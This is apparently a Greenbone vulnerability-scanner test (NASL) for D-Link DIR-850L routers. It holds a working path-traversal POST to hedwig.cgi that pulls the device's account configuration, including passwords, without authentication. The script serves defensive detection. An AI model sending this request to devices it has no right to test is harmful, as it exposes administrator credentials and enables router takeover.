# SPDX-FileCopyrightText: 2017 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.140304");
  script_version("2025-07-02T05:41:52+0000");
  script_tag(name:"last_modification", value:"2025-07-02 05:41:52 +0000 (Wed, 02 Jul 2025)");
  script_tag(name:"creation_date", value:"2017-08-16 16:49:52 +0700 (Wed, 16 Aug 2017)");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");

  script_tag(name:"qod_type", value:"exploit");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("D-Link DIR-850L < 1.14B07 BETA Multiple Vulnerabilities");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2017 Greenbone AG");
  script_family("Web application abuses");
  # nb: Experiences in the past have shown that various different devices might be affected
  script_dependencies("gb_dlink_dsl_consolidation.nasl", "gb_dlink_dap_consolidation.nasl",
                      "gb_dlink_dir_consolidation.nasl", "gb_dlink_dwr_consolidation.nasl");
  script_mandatory_keys("d-link/http/detected");

  script_tag(name:"summary", value:"D-Link DIR-850L is prone to multiple vulnerabilities.

  This vulnerability was known to be exploited by the IoT Botnet 'Reaper' in 2017.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP POST request and checks the response.");

  script_tag(name:"insight", value:"D-Link DIR 850L is prone to multiple vulnerabilities:

  - Remote Command Execution via WAN and LAN

  - Remote Unauthenticated Information Disclosure via WAN and LAN

  - Unauthorized Remote Code Execution as root via LAN");

  script_tag(name:"affected", value:"D-Link DIR-850L devices are known to be affected.

  Other devices and models might be affected as well.");

  script_tag(name:"solution", value:"Update to version 1.14B07 BETA or later.");

  script_xref(name:"URL", value:"https://blogs.securiteam.com/index.php/archives/3364");
  script_xref(name:"URL", value:"http://blog.netlab.360.com/iot_reaper-a-rappid-spreading-new-iot-botnet-en/");

  exit(0);
}

CPE_PREFIX = "cpe:/o:dlink";

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");

if (!infos = get_app_port_from_cpe_prefix(cpe: CPE_PREFIX, service: "www"))
  exit(0);

port = infos["port"];
CPE = infos["cpe"];

if (!dir = get_app_location(cpe: CPE, port: port))
  exit(0);

if (dir == "/")
  dir = "";

url = dir + "/hedwig.cgi";

data = '<?xml version="1.0" encoding="utf-8"?>\n' +
       '<postxml>\n' +
       '<module>\n' +
       '<service>../../../htdocs/webinc/getcfg/DEVICE.ACCOUNT.xml</service>\n' +
       '</module>\n' +
       '</postxml>';
cookie = "uid=vt-test";

req = http_post_put_req(port: port, url: url, data: data, add_headers: make_array("Cookie", cookie, "Content-Type", "text/xml"));
res = http_keepalive_send_recv(port: port, data: req, bodyonly: TRUE);

if (res && egrep(pattern: "<result>OK</result>", string: res) &&
    egrep(pattern: "<password>.*</password>", string: res)) {
  report = "It was possible to access the configuration without authenticating which contains sensitive information.\n\nResponse:\n\n" + res;
  security_message(port: port, data: report);
  exit(0);
}

exit(99);
